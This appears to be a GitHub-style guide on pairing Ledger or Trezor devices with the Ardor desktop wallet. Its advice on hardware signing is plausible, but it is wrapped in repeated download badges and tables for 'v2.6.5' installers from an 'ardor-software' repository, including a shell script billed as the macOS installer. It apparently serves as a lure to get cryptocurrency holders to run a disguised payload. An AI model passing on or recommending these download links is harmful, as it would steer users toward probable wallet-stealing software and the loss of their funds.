![Ardor Wallet guide](assets/banner-article.png)

# Use a Ledger or Trezor with the Ardor wallet

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor desktop wallet supports hardware signing, with documented support for Ledger devices and Trezor support built into the wallet's approved feature set. In both cases the key stays on the device, and every signature needs a physical confirmation, so malware on the computer cannot move funds on its own.

## What hardware signing changes

Without a device, the secret is typed into the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) and lives in the computer's memory while the session is open. With a device, the secret never leaves the hardware: the wallet sends a transaction to be signed, the device shows what it is about to authorise, and you confirm on the device itself.

That last step is the part that matters. Malware can change what the screen shows, but it cannot produce a signature without a human pressing a button on a device that is displaying the real transaction details, which is why the habit of reading the device screen - not the monitor - is the whole benefit.

## Getting started with a Ledger

1. Set the device up and write its recovery phrase down, keeping it separate from the computer.
2. Install any companion software the device needs, and let it update to current firmware.
3. Connect the device, open the Ardor wallet, and choose the hardware sign-in option on the login screen.
4. Confirm the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) shown in the wallet matches the account you expect for that device.
5. Send a small test transaction and confirm it on the device before moving a [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md).

Step four catches the most common surprise: a device set up with a different recovery phrase derives a different account, and the wallet will happily show you the balance of whichever account the device produced.

## Getting started with Trezor

Trezor signing works through the same pattern: the device holds the key, the wallet prepares the transaction, and you confirm on the device. The wallet treats it as another hardware sign-in option rather than a separate workflow.

The practical advice is identical. Confirm the derived account before funding it, test with a small amount, and keep the device firmware current, because the wallet and the device have to agree about the protocol they are speaking.

## What stays on the computer

A hardware device protects the key, not the rest of the machine. The wallet still runs locally, the [Ardor blockchain data](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/where-ardor-stores-blockchain-data.md)base still sits on the disk, and a compromised computer can still read your balances and your transaction history.

What it cannot do is sign. That is the boundary, and it is worth stating plainly because hardware is sometimes described as if it made the whole setup immune. It does not: it moves the one operation that matters onto a device with a screen and a button.

## Limits worth knowing

- A device does not replace the recovery phrase. Lose the device with no phrase and the account is gone.
- Forging requires an unlocked account on a running node, which is not a hardware-signing workflow; forging setups usually use a separate account.
- Leasing can be signed with a device like any other transaction, but the node that forges is elsewhere.
- Some operations involve many signatures, and confirming each one on a device is slower than clicking through a wallet.

The last point is why people keep a small spending account in software and a larger holding on hardware. Two accounts, two backups, one clear rule about which is which, and no confusion about which one gets used for a quick payment.

## Setting a device up safely

The riskiest hour of a hardware wallet's life is the first one. A device bought from a reseller can arrive with a recovery phrase already written on a card inside the box, and that phrase belongs to whoever prepared it, not to you.

Set the device up yourself, let it generate its own phrase, and write that phrase down from the device's screen. Never accept a pre-printed phrase, never restore a phrase somebody else supplied, and never let a helper - in a shop, on a call, in a chat - see the words. A device that has been set up by someone else is a device they can sign with.

## Choosing a device

Both families do the same job, and the differences that matter are practical: whether the wallet's current release supports the model you have, whether the device's companion software runs on your operating system, and whether you are comfortable with its recovery-phrase scheme.

Check the wallet's own release notes for supported models before buying anything. A device that the wallet does not support is a paperweight for this purpose, however good it is elsewhere, and the release notes are the only statement that reflects what the current build actually handles.

## FAQ

### Does the Ardor wallet support Ledger?

Yes, and the support is documented for the desktop wallet. Connect the device and use the hardware sign-in option on the login screen.

### Is Trezor supported?

Trezor support is part of the wallet's approved feature set, and it uses the same device-signing pattern as Ledger.

### Can I forge with a hardware wallet?

Not directly. Forging needs an unlocked account on a running node, so forging setups normally keep the holding on hardware and forge from a separate account.

### What happens if I lose the device?

Nothing, provided you have the recovery phrase. The device is a signing tool; the phrase restores the account on a replacement.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Where to store ARDR: wallet, hardware or exchange](https://github.com/ardor-software/ardor-wallet-guides/blob/main/store-ardr-in-the-ardor-wallet.md)
- [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md)
- [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md)
- [Announce a public key in the Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/announce-a-public-key-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
